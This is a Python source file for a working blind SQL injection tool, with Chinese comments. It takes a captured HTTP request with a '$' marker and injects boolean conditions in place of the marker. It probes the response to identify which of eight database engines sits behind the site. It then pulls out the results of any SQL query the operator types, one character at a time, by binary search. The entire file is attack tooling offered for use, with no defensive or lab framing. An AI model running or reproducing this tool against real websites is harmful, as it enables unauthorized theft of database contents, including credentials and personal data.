import sys
import requests
from urllib import parse
import argparse

# 目前仅支持URL和DATA中的sql注入
NO_DOLLAR = 0
IN_GET = 1
IN_DATA = 2
IN_HEAD = 3
# 记录执行条件为真时返回包长度
Exp720Len = 0
# 数据库类型，0:mysql，1:sqlserver，2:oracle，3:DB2 ...
DATABASE_TYPE = 0

startUrl = ''
startData = ''
# 条件判断模式
JUDGEM = 1

sess = requests.Session()

def Argparse():
    parser = argparse.ArgumentParser(usage="%(prog)s [options]",add_help=False,
    formatter_class=argparse.RawDescriptionHelpFormatter,
    description=(u'''
        作者：xiaomi'''))
    optional = parser.add_argument_group('optional arguments')
    optional.add_argument('-h', '--help', action="store_true", help='help of the %(prog)s program')
    optional.add_argument('--version', action='version', version='%(prog)s 1.1')

    args = parser.add_argument_group('Necessary parameter')
    args.add_argument('-r','--read',help=u'指定数据包所在路径')
    args.add_argument('--cdbs', action="store_true", default=False, help=u'选择指定数据库')
    args.add_argument('--ssl', action="store_true", default=False, help=u'使用https协议')
    
    args=parser.parse_args()
    args = vars(args)
    if len(sys.argv) == 1 or args['help']:
        parser.print_help()
        sys.exit()
    if not args['read']:
        print('请输入数据包所在路径！')
        sys.exit()
    return args

ARGV = Argparse()

class pack:
    _option = ''
    _url = ''
    _http = ''
    _head = dict()
    _data = dict()
    _hvDollar = NO_DOLLAR
    # 记录$在data中的key值
    _KeyInData = ''
    def pkPrint(self):
        print(self._option)
        print(self._url)
        print(self._http)
        print(self._head)
        print(self._data)

def printT(ptstr):
    print('\033[32m[+] %s\033[0m'%ptstr)

def printF(ptstr):
    print('\033[31m[x] %s\033[0m'%ptstr)

# 分析数据包，获取方法，url，head，data
def analysePack(path):
    row = 0
    _pack = pack()
    _packInfo = list()

    try:
        f = open(file = path,mode = 'r',buffering = True)
        # 记录行数
        row = 1
        while True:
            line = f.readline()
            if not line:
                break
            if '$' in line:
                if row == 1:
                    _pack._hvDollar = IN_GET
                else:
                    _pack._hvDollar = IN_DATA
            _packInfo.append(line)
            row = row + 1
    except IOError as e:
        printF("报错"+str(e))
    
    # 解析第一行
    index_1 = _packInfo[0].find(' ')
    _pack._option = _packInfo[0][:index_1]
    index_2 = _packInfo[0].find(' HTTP/')
    _pack._http = _packInfo[0][index_2+1:-1]
    row = row + 1
    # 获取head
    for i in range(len(_packInfo)-1):
        ii = i + 1
        if _packInfo[ii] == '\n':
            row = ii
            break
        iflag = _packInfo[ii].find(':')
        _pack._head[_packInfo[ii][:iflag]] = _packInfo[ii][iflag+1:-1].strip()
    # 获取url
    if ARGV['ssl'] == False:
        _pack._url = 'http://' + _pack._head['Host'] + _packInfo[0][index_1+1:index_2]
    else:
        _pack._url = 'https://' + _pack._head['Host'] + _packInfo[0][index_1+1:index_2]

    # 获取data    
    row = row + 1
    if row < len(_packInfo):
        _packInfo[row] = _packInfo[row].replace('+','%20')     # 将请求体中的+号替换成%20
        dTemp = _packInfo[row].split('&')
        for item in dTemp:
            iflag = item.find('=')
            _pack._data[item[:iflag]] = parse.unquote(item[iflag+1:])
    return _pack

# 条件判断为真返回true，反之返回false
def judgeTF(rsp):
    # 方法一：根据返回的数据包长度不同判断
    if JUDGEM == 1:
        if len(rsp.text) == Exp720Len:
            return True
        else:
            return False
    # 方法二：根据状态码不同判断
    elif JUDGEM == 2:
        if rsp.status_code != 200:
            return True
        else:
            return False
    # 方法三：根据是否存在某个字符串判断
    elif JUDGEM == 3:
        if 'exp(720)' in rsp.text:
            return True
        else:
            return False
    # 可自定义判断条件
    # elif JUDGEM == 4:
    else:
        printF('sql注入失败，请检查数据包和判断条件。')
        exit()


# 返回不同数据库时不同payload
def retDifDbPayload(sql_stat,pos,num):
    if DATABASE_TYPE == 1:
        payload = "ascii(substr(("+sql_stat+"),%s,1))>=%s"%(pos,num)
    elif DATABASE_TYPE == 2:
        payload = "ascii(substring(("+sql_stat+"),%s,1))>=%s"%(pos,num)
    elif DATABASE_TYPE == 3:
        payload = "ascii(substr(("+sql_stat+"),%s,1))>=%s"%(pos,num)
    elif DATABASE_TYPE == 4:
        payload = "ascii(substr(("+sql_stat+"),%s,1))>=%s"%(pos,num)
    elif DATABASE_TYPE == 5:
        payload = "asc(mid(("+sql_stat+"),%s,1))>=%s"%(pos,num)
    elif DATABASE_TYPE == 6:
        payload = "substr(("+sql_stat+"),%s,1)>='%s'"%(pos,chr(num))
    elif DATABASE_TYPE == 7:
        payload = "ascii(substring(("+sql_stat+"),%s,1))>=%s"%(pos,num)
    elif DATABASE_TYPE == 8:
        payload = "ascii(substring(("+sql_stat+"),%s,1))>=%s"%(pos,num)
    else:
        printF('暂不支持其它数据库的注入！')
    return payload

# 实时打印字符串
def printstr(pstr):
    sys.stdout.write(pstr)
    sys.stdout.flush()

def boolsql(rtPack:pack, sql_stat):
    # 二分法开始爆破字符
    sql_result = ''
    pos = 1
    # 多循环一次开关
    isMore = False
    while 1:
        leftN = 31
        rightN = 128
        if DATABASE_TYPE == 4:  #DB2数据库不检测空格字符
            leftN = 33
        while 1:
            num = (leftN+rightN)//2
            payload = retDifDbPayload(sql_stat,pos,num)
            if rtPack._hvDollar == IN_GET:
                payload = parse.quote(payload)
                rtPack._url = startUrl.replace('$',payload)
            elif rtPack._hvDollar == IN_DATA:
                # 绕过防火墙，后面再做
                ##
                rtPack._data[rtPack._KeyInData] = startData.replace('$',payload)
            else:
                # 暂时不支持其它位置的注入
                printF('暂时不支持其它位置的注入,程序结束！')
                exit()
                
            rsp = pkSend(rtPack=rtPack)
            # 成功
            if judgeTF(rsp) == True:
                leftN = num
                if rightN - leftN <= 1:
                    # 当给的数据包有问题时，作为条件判断为真的数据包也就不为真了，此处提示数据包有问题
                    if leftN == 127:
                        printF('数据包有问题，请重新确认数据包，程序退出！')
                        exit()
                    ac = chr(leftN)
                    sql_result += ac
                    if len(sql_result) == 1:
                        print('\033[33m[o] ',end='')
                    printstr(ac)    #实时打印爆破字符
                    isMore = False  # 的确有数据，并非多一次循环，恢复isMore为False
                    break
            # 失败
            else:
                rightN = num
                if rightN - leftN == 0:
                    if len(sql_result) == 0:
                        printF('返回结果为空！')
                    else:
                        if isMore == False:  #多循环的一次不打印换行符
                            sql_result += '\n'
                            printstr('\n')
                            if DATABASE_TYPE == 6:  #SQLite数据库多循环一次，因为查询结果可能存在换行符
                                isMore = True
                                break
                    return sql_result
        pos += 1

# 发送数据包
def pkSend(rtPack:pack):
    # proxies = dict(http='http://127.0.0.1:8080')
    try:
        if rtPack._option == 'GET':
            rsp = sess.get(rtPack._url,headers=rtPack._head,timeout=15)
        elif rtPack._option == 'POST':
            rsp = sess.post(rtPack._url,headers=rtPack._head,data=rtPack._data,timeout=15)
        if rsp.status_code == 404:
            printF('status_code: 404,Exit.')
            exit()
        return rsp
    except Exception as e:
        printF(e)
        exit()

def getPdRsp(rtPack:pack,payload):
    if rtPack._hvDollar == IN_GET:
        rtPack._url = startUrl.replace('$',payload)
    elif rtPack._hvDollar == IN_DATA:
        rtPack._data[rtPack._KeyInData] = startData.replace('$',payload)
    rsp = pkSend(rtPack=rtPack)
    return rsp


def main():
    rtPack = analysePack(ARGV['read'])
    # rtPack.pkPrint()
    global DATABASE_TYPE
    global Exp720Len
    global startData
    global startUrl

    # 判断$所在位置，目前支持url和data两处位置
    if rtPack._hvDollar == IN_DATA:
        # print('在data中')
        for key in rtPack._data.keys():
            if '$' in rtPack._data[key]:
                rtPack._KeyInData = key
    # elif rtPack._hvDollar == IN_GET:
    #     printT('在url中')
    elif rtPack._hvDollar != IN_GET and rtPack._hvDollar != IN_DATA:
        printF('$符号不在URL和DATA中，程序结束！')
        exit()

    # 保存初始值
    if rtPack._hvDollar == IN_GET:
        startUrl = rtPack._url
    elif rtPack._hvDollar == IN_DATA:
        startData = rtPack._data[rtPack._KeyInData]

    if rtPack._hvDollar == NO_DOLLAR:
        rsp = pkSend(rtPack=rtPack)
        printT(rsp.status_code)
    else:
        printT('检测到$号，开始进行bool注入!')
        # 记录条件为真时的数据包
        payload = '1=1'
        Exp720Len = len(getPdRsp(rtPack,payload).text) # 记录为真时数据包长度
        global JUDGEM
        while judgeTF(getPdRsp(rtPack,'1=1')) == judgeTF(getPdRsp(rtPack,'1=2')):
            JUDGEM = JUDGEM+1   # 调整判断模式
        # 自动检测
        if ARGV['cdbs'] == False:
            if judgeTF(getPdRsp(rtPack,'length(@@version_compile_os)>0')) == True:
                printT('Mysql')
                DATABASE_TYPE = 1
            elif judgeTF(getPdRsp(rtPack,'exists(select * from master.dbo.ijdbc_function_escapes)')) == True:   # 先判断sybase
                printT('Sybase')
                DATABASE_TYPE = 8
            elif judgeTF(getPdRsp(rtPack,'(select count(*) from sysobjects)>0')) == True:
                printT('Sql Server')
                DATABASE_TYPE = 2
            elif judgeTF(getPdRsp(rtPack,'(select count(*) from sys.user_tables)>0')) == True:
                printT('Oracle')
                DATABASE_TYPE = 3
            elif judgeTF(getPdRsp(rtPack,'(select count(*) from sysibm.sysdummy1)>0')) == True:
                printT('DB2')
                DATABASE_TYPE = 4
            elif judgeTF(getPdRsp(rtPack,'(select count(*) from msysobjects)>0')) == True:  # 如果没有msysobjects表，就不支持自动检测了
                printT('Access')
                DATABASE_TYPE = 5
            elif judgeTF(getPdRsp(rtPack,'length(sqlite_version())>0')) == True:
                printT('SQLite')
                DATABASE_TYPE = 6
            elif judgeTF(getPdRsp(rtPack,'(select count(*) from pg_database)>0')) == True:
                printT('PostgreSQL')
                DATABASE_TYPE = 7
            else:
                printF('暂不支持该类型的数据库注入！')
                exit()
        # 手动输入 
        else:
            try:
                dbType = int(input('请输入数据库类型：\n1:Mysql\n2:SQL Server\n3:Oracle\n4:DB2\n5:Access\n6:SQLite\n7:PostgreSQL\n8:Sybase\n0:exit\n'))
                if dbType != 0 and dbType != 1 and dbType != 2 and dbType != 3 and dbType != 4 and dbType != 5 and dbType != 6 and dbType != 7 and dbType != 8:
                    printF('请输入正确的数字！')
                    exit()
                if dbType == 0:
                    exit()
            except Exception as e:
                printF(e)
                exit()
            DATABASE_TYPE = dbType
        while 1:
            sql_stat = input('\033[36m>>> ')
            if sql_stat == 'exit' or sql_stat == 'quit':    # 退出
                print('\033[35m[o] Exit\033[0m')
                break
            boolsql(rtPack,sql_stat)
if __name__ == '__main__':
    main()